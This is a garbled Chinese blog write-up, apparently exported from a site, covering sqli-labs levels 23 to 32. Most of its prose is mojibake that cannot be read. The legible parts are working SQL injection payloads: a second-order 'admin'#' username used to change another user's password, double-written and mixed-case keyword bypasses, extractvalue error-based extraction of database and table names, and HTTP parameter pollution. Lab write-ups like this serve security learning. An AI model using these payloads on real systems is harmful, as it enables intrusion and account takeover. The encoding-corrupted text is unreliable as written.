å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ã€‚è¯­æ³•ï¼špreg_replace(è¦æ›¿æ¢çš„ä¸œè¥¿ï¼Œæ›¿æ¢æˆå•¥ä¸œè¥¿ï¼Œå“ªä¸ªé‡Œé¢çš„ä¸œè¥¿éœ€è¦æ›¿æ¢);çŸ¥é“è¿™ä¸ªä»¥åæˆ‘ä»¬ä¸éš¾å‘ç°ï¼Œå†ä¸Šé¢è¿™ä¸ªä»£ç ä¸­ æˆ‘ä»¬çš„æ³¨é‡Šç¬¦éœ€è¦æ›¿æ¢ã€‚ é‚£ä¹ˆæ³¨é‡Šç¬¦è¢«æ›¿æ¢æˆ‘ä»¬è¯¥å¦‚ä½•å®ç°æ³¨å…¥å‘¢ï¼Ÿæˆ‘ä»¬è¦å›å½’ä½¿ç”¨æ³¨é‡Šç¬¦çš„æœ¬è´¨ï¼šæ²¡åŠ æ³¨é‡Šç¬¦å‰åé¢çš„è¯­å¥å› ä¸ºæ²¡æœ‰é—­åˆæ‰€ä»¥ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘ä»¬åŠ äº†æ³¨é‡Šç¬¦ç›´æ¥è®©å…¶æ¶ˆå¤±å°±å¥½äº†ï¼Œè€Œç°åœ¨æ²¡äº†æ³¨é‡Šç¬¦ï¼Œæˆ‘ä»¬å°±éœ€è¦å°†è¯­å¥é—­åˆèµ·æ¥ï¼Œä½¿å…¶ä¸æŠ¥é”™ï¼Œå«åšå•å¼•å·é—­åˆç»•è¿‡è¿™ä¸ªå…¶å®ä¹‹å‰é‡åˆ°è¿‡ åŠ äº†è¶…çº§å¤šå¼•å·ï¼Œæˆ‘çœ‹å¤ªéº»çƒ¦å°±æ²¡å»è¯•ï¼Œä»Šå¤©çœ‹æ¥ä¸å¾—ä¸è¯•äº†ï¼ï¼ï¼åœ¨ä¹‹å‰æ›´æ­£çš„åŸç†ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“äº†é—­åˆå•å¼•å·çš„çœŸç›¸ï¼Œæ‰€ä»¥è¿™å…³ç°åœ¨å°±æ˜¾å¾—å¾ˆç®€å•äº†æœ‰ä¸ªé—®é¢˜ï¼šä¸ºå•¥order by åœ¨è¿™é‡Œå¥½åƒä¸ç®¡æ€ä¹ˆæ”¾ç½®éƒ½æ˜¯é”™è¯¯çš„ï¼Œè¿™å°±å¾ˆçº³é—·äº†ï¼Ÿï¼Ÿorder by åé¢åŠ æ•°å­—ï¼ŒåŠ å­—æ®µåéƒ½æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯å­—æ®µåæ˜¯ä¸å¯ä»¥å¸¦å¼•å·çš„ï¼Œæ„æ€æ˜¯è®©è¿™ä¸ªåˆ—æ’åºï¼Œä½†æ˜¯å› ä¸ºå•å¼•å·é—­åˆåé‡Œé¢çš„æ•°å­—å˜æˆå­—ç¬¦ä¸²äº†è¿™å°±äº§ç”Ÿäº†è¯­æ³•é”™è¯¯ã€‚ æ›´æœ¬è´¨çš„è¯´æ³•æ˜¯ï¼šä¸åªorder byï¼Œå‡¡æ˜¯å­—ç¬¦ä¸²ä½†åˆä¸èƒ½åŠ å¼•å·çš„ä½ç½®éƒ½ä¸èƒ½å‚æ•°åŒ–ï¼›åŒ…æ‹¬sqlå…³é”®å­—ã€åº“åè¡¨åå­—æ®µåå‡½æ•°åç­‰ç­‰æ¥è‡ª46å…³çš„ä¸€ä¸ªè¡¥å……çº é”™ payloadï¼š?id=-1â€™union select 1,database(),â€™3 è¿™ä¸ªæ—¶å€™æ•°æ®åº“å°±å‡ºæ¥äº†payloadï¼š?id=-1â€™union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=â€™securityâ€™ orâ€™1=1 ç¬¬24å…³è¿™å…³å°±å’Œä¹‹å‰çš„å¾ˆä¸ä¸€æ ·äº†æŸ¥é˜…èµ„æ–™å çŸ¥é“ä¸€ä»¶äº‹ï¼šSQLæ³¨å…¥ä¸€èˆ¬åˆ†ä¸ºä¸¤ç±»ï¼šä¸€é˜¶SQLæ³¨å…¥ï¼ˆæ™®é€šSQLæ³¨å…¥ï¼‰ï¼ŒäºŒé˜¶SQLæ³¨å…¥ä»€ä¹ˆæ˜¯äºŒé˜¶æ³¨å…¥ï¼š1.æ„é€ å¸¦æœ‰æ³¨å…¥è¯­å¥çš„å±é™©payload1æ•°æ®ï¼Œåœ¨httpè¯·æ±‚ä¸­æäº¤åˆ°æœåŠ¡å™¨å½“ä¸­ï¼Œè¯¥æ•°æ®ä¼šè¢«æœåŠ¡å™¨å­˜å‚¨åˆ°æ•°æ®åº“å½“ä¸­2.å½“æˆ‘ä»¬è¦ä¿®æ”¹è¯¥payload1æ•°æ®çš„æ—¶å€™ï¼Œç¨‹åºåœ¨æ£€ç´¢å­˜å‚¨payload1çš„æ•°æ®åº“çš„æ—¶å€™å°†ä¼šé€ æˆSQLæ³¨å…¥ï¼Œå¦‚æœæ”»å‡»æˆåŠŸï¼Œåœ¨ç¬¬äºŒæ¬¡å“åº”ä¸­è¿”å›ç»“æœ3.ä¹Ÿç§°ä¸ºå­˜å‚¨å‹æ³¨å…¥ï¼Œå°†å¯èƒ½é€ æˆsqlæ³¨å…¥çš„è¯­å¥å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œå½“å†æ¬¡è°ƒç”¨è¯¥æ•°æ®çš„æ—¶å€™ï¼Œå°±å¯èƒ½å‘ç”ŸSQLæ³¨å…¥ã€‚å…ˆæ¥çœ‹çœ‹æºç å…ˆä»index.phpçœ‹èµ·ï¼šä¸€å¼€å§‹å°±æ˜¯ä¸€ä¸ªsession_start()å‡½æ•°seessionï¼šhttps://blog.csdn.net/zhengxijia2012/article/details/73437376è°ˆè°ˆæˆ‘çš„ç†è§£ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬ä¸€å¼€å§‹cookieså¯ä»¥åœ¨å¤šä¸ªé¡µé¢ä¿å­˜ä½¿ç”¨ï¼Œå°±æ˜¯å› ä¸ºæœ‰è¿™ä¸ªsessionå‡½æ•°å‘æŒ¥ä½œç”¨ç„¶ååœ¨å…¶ä»–æºç ä¸­ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°ï¼ŒåŸºæœ¬ä¸Šæ¯ä¸ªæ•°æ®éƒ½æœ‰è¿‡æ»¤æ“ä½œï¼Œä½†æ˜¯æˆ‘å‘ç° åœ¨pass_changeçš„æ—¶å€™ï¼Œä»–çš„usernameæ˜¯æ²¡æœ‰è¿‡æ»¤æ“ä½œçš„å¦‚ä¸Šï¼Œåœ¨ä¸‹é¢çš„updateè¯­å¥ä¸­ usernameæ˜¯ç›´æ¥ä»æ•°æ®åº“è¢«è°ƒç”¨çš„ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯èƒ½å¯ä»¥é€šè¿‡è¿™ä¸ªæ•°æ®è¿›è¡Œæ³¨å…¥ï¼ˆäºŒé˜¶æ³¨å…¥ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬è¦åˆ©ç”¨è¿™ç‚¹ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¿…é¡»æœ‰æ•°æ®æ˜¯å¸¦æœ‰å±é™©å­—ç¬¦çš„å­˜å‚¨åœ¨æ•°æ®åº“å½“ä¸­ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ•°æ®åº“ä¸­æ„å»ºè¿™æ ·ä¸€ä¸ªæ•°æ®ï¼Œä»ä¸Šé¢çš„ä»£ç ä¸­æˆ‘ä»¬å‘ç°ä»–çš„usernameæ˜¯ç”¨å•å¼•å·é—­åˆçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ„å»ºä¸€ä¸ªå•å¼•å·æ³¨å…¥çš„æ•°æ®â€”â€”adminâ€™# ï¼Œè¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼šä¸æ˜¯è¢«è½¬ä¹‰äº†å—ï¼Œä¸ºå•¥åœ¨æ•°æ®ä¸­è¿˜ä¼šä»¥å•å¼•å·çš„å½¢å¼å­˜åœ¨ï¼Œè¿™æ˜¯å› ä¸ºè½¬ä¹‰åªæ˜¯æš‚æ—¶çš„ï¼Œå­˜å‚¨ä»¥åè¿˜æ˜¯ä»¥å•å¼•å·çš„å½¢å¼å­˜åœ¨çš„ æ¥ä¸‹æ¥æˆ‘ä»¬ç ”ç©¶ä¸€ä¸‹ ä¸ºå•¥å¯ä»¥æ›´æ”¹ åŸSQLè¯­å¥ï¼š UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ä¿®æ”¹å¯†ç çš„SQLè¯­å¥ï¼š update users set password='$pass' where username='$username' and password='$curr_pass' æœ€åçœŸæ­£æ‰§è¡Œçš„sqlè¯­å¥ï¼š update users set password=='$pass' where username='admin' ä½†æ˜¯è¿™ä¸ªå…·æœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åªèƒ½ä¿®æ”¹ç‰¹å®šçš„ç”¨æˆ·çš„å¯†ç ï¼Œæ¯”å¦‚è¯´æˆ‘æƒ³ä¿®æ”¹ä¸Šè¡¨ä¸­çš„dumbï¼Œé‚£ä¹ˆæˆ‘å°±å¾—åœ¨åˆ›å»ºä¸€ä¸ªdumb'#çš„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“å½“ä¸­ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–æ”»å‡»æ‰‹æ³•ï¼š **1æŠ¥é”™æ³¨å…¥ï¼š** ![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20201201122617.png) æœ‰é”™å°±dieç½‘é¡µï¼Œso æŠ¥é”™æ³¨å…¥ä¸è¡Œ2.å»¶æ—¶æ³¨å…¥æœ‰å­—ç¬¦æ•°é™åˆ¶ï¼Œæ‰€ä»¥ä¸è¡Œ ç¬¬25å…³é¦–å…ˆçœ‹ä¸€ä¸‹æºä»£ç ï¼šå‘ç°å®šä¹‰äº†blacklist()å‡½æ•°ä½œç”¨å¦‚ä¸‹ï¼Œå°±æ˜¯è¿‡æ»¤æ‰ or å’Œandï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿçœ‹åˆ°è¿™ä¸ªæˆ‘ä»¬å°±çŸ¥é“æ˜¯å•å¼•å·æ³¨å…¥ï¼Œæ¥ä¸‹æ¥æˆ‘è¯•ç€æ„å»ºpayloadè¯•è¯•ä»é‚£ä¸ªpreg_replaceå‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œä»–æ˜¯å°†orè½¬ä¹‰æˆå•¥éƒ½æ²¡æœ‰ï¼Œæ‰€ä»¥æœ‰ä¸€ç§æ€è·¯æ˜¯ï¼Œåœ¨andé‡Œé¢æ’å…¥and è½¬ä¹‰å®Œåå³å¯ç•™ä¸‹æˆ‘ä»¬æœ¬æ¥çš„è¯­å¥æ‰€ä»¥payload 12?id=1'aandnd 1=2 --+?id=1'oorrder by 3 --+ OK ç»•è¿‡æˆåŠŸ ç„¶åæˆ‘ä»¬åªéœ€è¦ç”¨order by æŸ¥è¯¢å­—ç¬¦æ®µæ•°ç›®ï¼Œç„¶åunionæ‹¼æ¥ä¸€ä¸‹è¯­å¥å³å¯ç»•è¿‡ã€‚ è¿™é‡Œå‡ºç°äº†ä¸€ä¸ª$hint=$id; ç„¶åæœ€ååˆreturnäº†ä¸€ä¸ªi$idï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çŸ¥é“,$hintæ˜¯ç”¨æ¥å‚¨å­˜å­˜æ”¾æ•°æ®çš„ï¼Œä½œç”¨æ˜¯æ›´æ–¹ä¾¿ï¼Œä¸è¿‡è¿™ä¹Ÿè®©æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬è¾“å…¥çš„è¯­å¥åˆ°ç¨‹åºé‡Œé¢ä¼šå˜æˆå•¥æ ·çš„ã€‚ å…¶ä»–ç»•è¿‡æ–¹æ³•ç»•è¿‡æ€è·¯ï¼šï¼ˆ1ï¼‰å¤§å°å†™å˜å½¢ Or,OR,oRï¼ˆ2ï¼‰ç¼–ç ï¼Œhexï¼Œurlencodeï¼ˆ3ï¼‰æ·»åŠ æ³¨é‡Š/or/ï¼ˆ4ï¼‰åˆ©ç”¨ç¬¦å· and=&amp;&amp; or=||ï¼ˆ5ï¼‰åŒå†™ç»•è¿‡https://blog.csdn.net/qq_42181428/article/details/105061424?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control è¿™ä¸ªæ˜¯å…³äºç»•è¿‡çš„ä»¥åŠCTFé¢˜ç›®çš„ä¸€ç¯‡æ–‡ç« ï¼Œæ„Ÿè§‰è¿˜æŒºå‰å®³ æˆ‘åˆæ²¡ä¿å­˜åšå®¢äººå‚»äº†â€”â€”-ç¬¬25å…³aå’Œ25å…³æ²¡å¤šå¤§åŒºåˆ« 26å…³å…ˆç ”ç©¶ä¸€ä¸‹æºä»£ç  é¦–å…ˆæ˜¯ä¸€ä¸ªæ–°å‡½æ•°fopen()å‡½æ•°fopen()å‡½æ•°ç”¨äºæ‰“å¼€æ–‡ä»¶æ–‡ä»¶æˆ–è€…URLï¼Œè¯­æ³•:fopen(filename,mode,include_path,context)è€Œåœ¨è¿™ä¸ªé‡Œé¢çš„æ„æ€æ˜¯ æ‰“å¼€é‚£ä¸ªtxtç„¶åå†™å…¥æ•°æ®ã€‚æˆ‘ä»¬æ¥ç€å¾€ä¸‹çœ‹ åœ¨è¿™å…³å½“ä¸­ï¼Œä»–è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ æˆ‘ä»¬ä¾æ¬¡æ¥çœ‹çœ‹å§ï¼Œåˆ†åˆ«æ˜¯ï¼š ä¸‰ç§æ³¨é‡Šç¬¦ï¼Œç©ºæ ¼ï¼Œè¿˜æœ‰åæ–œæ ï¼Œè¿˜æœ‰andï¼Œorï¼ˆè¿™é‡Œè¦ç‰¹åˆ«æ³¨æ„informationé‡Œé¢æœ‰ä¸ªoræ‰€ä»¥ä¹Ÿä¼šè¢«è¿‡æ»¤ï¼Œ æ‰€ä»¥åœ¨æ³¨å…¥çš„æ—¶å€™è®°å¾—æ³¨æ„ä¹Ÿè¦åŒå†™ï¼‰å¥½äº† æ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹è¯•ç€ç»•è¿‡ï¼š1.å› ä¸ºç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡å–æ˜¯ç”¨æ‹¬å·çš„æ–¹å¼ç»•è¿‡è¿™ä¸ªè¿‡æ»¤2.ç”±äºæ³¨é‡Šç¬¦è¿‡æ»¤ï¼Œé™¤äº†ç”¨ä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦ä»£è¡¨æ³¨é‡Šç¬¦ï¼Œæˆ‘ä»¬è¿™é‡Œå…ˆé‡‡ç”¨é—­åˆå•å¼•å·çš„æ–¹å¼ç»•è¿‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬çŸ¥é“ï¼Œå•å¼•å·å†…çš„å†…å®¹ä¼šè¢«è½¬å˜æˆå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æœ‰ç”¨åˆ°æ•°å­—çš„æ–¹æ³•åœ¨è¿™é‡Œéƒ½è¡Œä¸é€šï¼Œä½¿ç”¨unionæ‹¼æ¥è¯­å¥çš„æ—¶å€™ï¼Œå¯ä»¥è·å–åˆ°æ•°æ®åº“ï¼Œä½†æ˜¯å†å¾€ä¸‹ç”±äºè¦ä½¿ç”¨limitæ‰€ä»¥ä¹Ÿä¸è¡Œäº†ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬é‡‡å–æŠ¥é”™æ³¨å…¥çš„æ–¹å¼ï¼šæ„å»ºpayloadï¼š//?id=1â€™aandnd(extractvalue(1,concat(â€˜â€˜,database(),â€™â€˜)))aandndâ€™1â€™=â€™1////?id=1â€™aandnd(extractvalue(1,concat(â€˜â€˜,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)=â€™securityâ€™),â€™â€˜)))aandndâ€™1â€™=â€™1// ç¬¬26aå…³è¿™å…³å’Œ26å…³æ²¡æœ‰å¤šå¤§åŒºåˆ«ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯è¿™é‡Œéœ€è¦é‡‡å–å•å¼•å·+æ‹¬å·çš„å½¢å¼æ¥æ³¨å…¥è¿˜æ˜¯æœ‰å…¶ä»–åŒºåˆ«çš„ï¼Œæ¯”å¦‚åœ¨è¿™å…³å½“ä¸­ï¼Œä»–æ˜¯ä¸è¾“å‡ºæŠ¥é”™ä¿¡æ¯çš„ï¼Œå¹¶ä¸”å› ä¸ºæ˜¯é‡‡å–å•å¼•å·+æ‹¬å·é—­åˆæ–¹å¼è¿›è¡Œæ³¨å…¥çš„ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦æ—¶é—´ç›²æ³¨çš„æ–¹å¼ï¼Œä¹Ÿä¸å¤ªè¡Œå› ä¸ºé—­åˆä»¥åï¼Œå•å¼•å·åŠ æ‹¬å·é‡Œé¢çš„å†…å®¹å°±ä¼šå˜æˆå­—ç¬¦ï¼Œè·Ÿä¹‹å‰ç”¨ä¸äº†order byæ˜¯ä¸€ä¸ªæ„æ€ã€‚æŸ¥äº†ä¸€ä¸‹å¥½åƒç¡®å®åªèƒ½ç”¨%a0è¿›è¡Œç»•è¿‡äº†ï¼Œç„¶åæ¥ä¸‹æ¥éœ€è¦å®‰è£…ä¸€ä¸‹è™šæ‹Ÿæœº ç¬¬27å…³è¿™å…³è¿‡æ»¤çš„æ˜¯è¿™å…³è¿‡æ»¤çš„æœ‰å¦‚ä¸‹å†…å®¹ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œè¿™æ¬¡æ²¡æœ‰è¿‡æ»¤andä½†æ˜¯è¿‡æ»¤äº†selectå’Œunionè¿˜æœ‰æ³¨é‡Šç¬¦é‚£äº›ç„¶åæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œè¿™ä¸€æ¬¡çš„æ­£åˆ™è¡¨è¾¾å¼å’Œå‰é¢å‡ ä¸ªåˆæœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œåæ–œæ åé¢åˆå¤šäº†ä¸€äº›å­—æ¯ä½œç”¨å¦‚ä¸‹ï¼š èµ„æ–™æ¥æºï¼š[https://www.baidu.com/s?rsv_op=c2KYgWdLVYcV2R3VPVh1WafSTX6XL0b2NMNbgbbP5faVPMWOgMNVVPSOQOU9XXcQghM678gVQZ9QeQaJYeYWeIR0335XMNab436TIP42cPUMd06IThM4hLJa&amp;wd=fopen%E5%87%BD%E6%95%B0&amp;ie=utf-8&amp;tn=49055317_3_hao_pg] https://blog.csdn.net/onthewaygun/article/details/10009021?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-1.controlæ ¹æ®ä»¥ä¸Šèµ„æ–™ æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œè¿™æ¬¡çš„æ­£åˆ™è¡¨è¾¾å¼æ›¿æ¢çš„æ›´åŠ ç‰›ï¼Œä»–æ˜¯ä¸€ç›´åœ¨æ›¿æ¢ï¼Œå°±æ˜¯è¯´ä¸èƒ½åŒé‹ï¼Œå› ä¸ºä½ åŒå†™å®Œä»¥åæ›¿æ¢è¿‡ä¸€éï¼Œå¾…ä¼šè¿˜ä¼šå†æ›¿æ¢ä¸€æ¬¡ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åªèƒ½é‡‡ç”¨å¤§å°å†™æ··æ­çš„æ–¹å¼è¿›è¡Œæ³¨å…¥//åˆšåˆšå±…ç„¶å´©æºƒäº†â€“å¯¼è‡´æ²¡ä¿å­˜ã€‚ã€‚æˆå¹´äººçš„å´©æºƒå°±åœ¨ä¸€ç¬é—´ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚// é‚£æˆ‘ä»¬æ¥ä¸‹æ¥æ„å»ºpayloadï¼š?id=1â€™and(extractvalue(1,concat(â€˜â€˜,database(),â€™â€˜)))andâ€™1=1?id=1â€™and(extractvalue(1,concat(â€˜â€˜,(seLeCt(group_concat(table_name))from(table_schema))=â€™securityâ€™),â€™â€˜)))andâ€™1=1 ä¸‹é¢ä¹Ÿæ˜¯è¿™æ ·çš„ä¸€å¥—ç»„åˆæ‹³ï¼Œå…¶å®æˆ‘å‘ç°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æŠ¥é”™æ³¨å…¥çš„åŸå› æ˜¯åœ¨æŠ¥é”™æ³¨å…¥çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥å°†æ‰€æœ‰æ•°æ®ä¸€èµ·æŠ¥é”™å‡ºæ¥ï¼ˆgroup_concatï¼‰å‡½æ•°ï¼Œä½†æ˜¯å½“åªèƒ½ä½¿ç”¨æ—¶é—´ç›²æ³¨çš„æ—¶å€™å°±æ²¡åŠæ³•äº†ï¼Œå› ä¸ºéƒ½æ˜¯éœ€è¦æ•°å­—è¯´æ˜æˆªå–ã€‚è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆåœ¨ä¸‹é¢çš„æŸ¥è¯¢è¯­å¥ä¸­oræ— æ³•æŠ¥é”™ï¼Œä½†æ˜¯andå¯ä»¥æŠ¥é”™ 27aå…³å› ä¸ºæ— æŠ¥é”™ä¿¡æ¯æ‰€ä»¥åªå¥½é‡‡å–æ—¶é—´ç›²æ³¨æˆ–è€…union selectè”åˆæ³¨å…¥ï¼Œç„¶åå°±éœ€è¦ç”¨åˆ°ç‰¹æ®Šè½¬ä¹‰å­—ç¬¦ã€‚ã€‚å¼€å§‹æ­linuxç³»ç»Ÿ ç¬¬28å…³ æ„Ÿè§‰è¿˜æ˜¯éœ€è¦ä½¿ç”¨linuxç³»ç»Ÿè¿›è¡Œæ“ä½œä¼šæ¯”è¾ƒæ–¹ä¾¿ä¸€äº›ï¼Œç”¨æ‹¬å·çš„æ–¹å¼è¿›è¡Œé—­åˆå¤ªç´¯äº†28aå…³ä¹Ÿå’Œè¿™ä¸ªå·®ä¸å¤š å°ç»“ä¸€ä¸‹ï¼š1.æœ€è¿‘åšçš„éƒ½æ˜¯è¢«è¿‡æ»¤çš„é¢˜ç›®ï¼Œè¦å¦‚ä½•ç»•è¿‡è¿‡æ»¤æ–¹æ³•ä¹Ÿå°±æ˜¯è¿™å‡ ç§ä¼¼ä¹ä¹Ÿæ²¡å•¥å¥½è¯´çš„äº†â€“2.ç„¶åæºä»£ç çš„å­¦ä¹ æŒºæœ‰ç”¨çš„ï¼Œæ„Ÿè§‰çœ‹æºä»£ç å¯¹äºæ•´ä¸ªè¿‡ç¨‹ä¼šæ›´äº†è§£ä¸€äº›ï¼Œç„¶åæ³¨å…¥çš„è¿‡ç¨‹ä¹Ÿæ›´æœ‰æ„Ÿè§¦äº†ã€‚å‚è€ƒé“¾æ¥ï¼šhttps://www.cnblogs.com/forforever/p/13764024.html","link":"/2020/11/28/sqlilabs6/"},{"title":"sqlilabs7","text":"ç¬¬29å…³é¦–å…ˆç ”ç©¶ä¸€ä¸‹æºä»£ç é¦–å…ˆæ˜¯è¿™ä¸ª$_SERVER[â€˜QUERY_STRINGâ€™]ä½œç”¨ï¼šè·å–ï¼Ÿåé¢çš„å€¼https://www.cnblogs.com/mitang/p/3874291.html å­¦ä¹ é“¾æ¥ ç„¶åå»æŸ¥é˜…äº†ä¸€ä¸‹èµ„æ–™ï¼Œè¿™å…³åŸæ¥æ˜¯æœ‰ä¸¤ä¸ªæœåŠ¡å™¨åœ¨å…±åŒä½œç”¨ ä¸€ä¸ªæ˜¯Apacheå¦ä¸€ä¸ªæ˜¯Tomcat æ‰€ä»¥æˆ‘çš„ç†è§£æ˜¯ï¼Œtomcatå…ˆå¯¹æ¥å—çš„æ•°æ®è¿›è¡Œè¿‡æ»¤å¤„ç†ç„¶åå†äº¤ç”±apacheï¼ˆPHPï¼‰ï¼Œä½†å…¶å®æˆ‘ä»¬å¯ä»¥çœ‹å‡ºåœ¨è¿™ä¸ªé‡Œé¢ï¼Œä¹Ÿå°±æ˜¯çœ‹çœ‹æ˜¯å¦å¸¦æ•°å­—ï¼Œå¦‚æœæ˜¯çš„è¯å°±æŠŠè¿™ä¸ªæ•°æ®ä¼ é€’ç»™Apacheï¼Œæ²¡æœ‰æ€ä¹ˆè¿›è¡Œè¿‡æ»¤çš„æ„Ÿè§‰å‘€ï¼ŸåŸæ¥ä½¿æˆ‘ä»¬ç†è§£é”™äº†ï¼Œè¿™ä¸ªçš„æ„æ€æ˜¯ï¼šä»getçš„idé‡Œé¢åŒ¹é…ä»¥æ•´æ•°ç»“å°¾çš„æ•°æ®ï¼Œå¦‚æœæˆ‘ä»¬åœ¨è¿™ä¸ªid ä¸­æ’å…¥æˆ‘ä»¬çš„æ³¨å…¥è¯­å¥ï¼Œé‚£ä¹ˆåŒ¹é…å°±ä¼šè¿”å›falseï¼Œå› ä¸ºä¸æ˜¯ä»¥æ•´æ•°ç»“å°¾ï¼Œè¿™ä¸ªè¿‡æ»¤å¾ˆå¼ºå•Šï¼Œç›¸å½“äºä¸€ä¸ªwafé‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿ HPPï¼ˆHTTPParameterPollutionï¼‰åˆ©ç”¨è¿™ä¸ªåœ¨å‰é¢é‚£å¼ å›¾ä¸­ï¼Œæˆ‘ä»¬å¾—çŸ¥tomcatæ˜¯å–ç¬¬ä¸€ä¸ªæ•°æ®ï¼Œapacheæ˜¯å–ç¬¬äºŒä¸ªæ•°æ®ï¼Œå¹¶ä¸”apacheæ‰æ˜¯å¤„ç†æˆ‘ä»¬æ•°æ®å¹¶ä¸”è¾“å‡ºçš„æœåŠ¡å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä¸¤ä¸ªæ•°æ®ï¼Œè®©tomcatåªå–å¾—ç¬¬ä¸€ä¸ªåˆæ³•æ•°æ®ï¼Œè€Œç¬¬äºŒä¸ªå±é™©è¯­å¥å°±è®©apacheå¤„ç†ï¼Œè¾¾åˆ°æˆ‘ä»¬çš„æ³¨å…¥æ•ˆæœã€‚æ¥ä¸‹æ¥æ„å»ºpayloadï¼š?id=1&amp;?id=-2â€™union select 1,database(),3 â€“+å³å¯æˆåŠŸç»•è¿‡ ç¬¬ä¸‰åäºŒå…³å®½å­—ç¬¦æ³¨å…¥é—®é¢˜è¿˜æ˜¯å…ˆæ¥åˆ†æä¸€ä¸‹æºä»£ç åœ¨è¿™ä¸ªé¢˜ç›®å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç° ä»–å¯¹getçš„çš„idè¿›è¡Œäº†è¿‡æ»¤ï¼Œè¿™é‡Œä¸€å¼€å§‹æœ‰ä¸ªç–‘é—®ï¼Œä»–è¿™è¾¹æ˜¯å¯¹$string è€Œåœ¨ä¸‹é¢çš„æ—¶å€™æ˜¯å¯¹get[$id] ä½†æ˜¯å…¶ä¸­ä¹Ÿæ²¡æœ‰è®©$string=è¿™ä¸ªgetçš„å‘½ä»¤ã€‚åæ¥å‘ç° åœ¨å‡½æ•°ä¸­å…¶å®getçš„è¿™ä¸ªæ•°æ®å°±ç›´æ¥ç­‰äºè¿™ä¸ª$stringäº† ç„¶åè¿™è¾¹è¿‡æ»¤çš„æœ‰åæ–œæ å’Œå•å¼•å·ç¬¬ä¸€å¥æ˜¯å½“ä¸­å‡ºç°çš„preg_quote()**å®šä¹‰å’Œç”¨æ³•preg_quote()éœ€è¦å‚æ•° str å¹¶å‘å…¶ä¸­ æ¯ä¸ªæ­£åˆ™è¡¨è¾¾å¼è¯­æ³•ä¸­çš„å­—ç¬¦**å‰å¢åŠ ä¸€ä¸ªåæ–œæ ç„¶åæ¥ä¸‹æ¥çš„ä¸¤ä¸ªæ˜¯ä¸ºäº†é¿å…ä½ æƒ³åŠ ä¸€ä¸ªåæ–œæ æŠŠä¸Šä¸€ä¸ªåæ–œæ ç»™æ³¨é‡Šæ‰è€Œå†™è¿›å»çš„ é‚£ä¹ˆæˆ‘ä»¬å†å¾€ä¸‹çœ‹ çœ‹åˆ°ä¸€ä¸ªset names gbkï¼šå¯ä»¥å†åœ¨å»ºæ•°æ®åº“çš„æ—¶å€™è®¾ç½®ï¼Œä¹Ÿå¯ä»¥åœ¨åˆ›å»ºè¡¨çš„æ—¶å€™è®¾ç½®ï¼Œæˆ–åªæ˜¯å¯¹éƒ¨åˆ†å­—æ®µè¿›è¡Œè®¾ç½®ï¼Œè€Œä¸”åœ¨è®¾ç½®ç¼–ç çš„æ—¶å€™ï¼Œè¿™äº›åœ°æ–¹æœ€å¥½æ˜¯ä¸€è‡´çš„ï¼Œè¿™æ ·èƒ½æœ€å¤§ç¨‹åº¦ä¸Šé¿å…æ•°æ®è®°å½•å‡ºç°ä¹±ç  åœ¨è¿™ä¸ªè¯­å¥ä¸­çš„æ„æ€æ˜¯ å¯¹$con1è¿›è¡Œ set names gbkç¼–ç 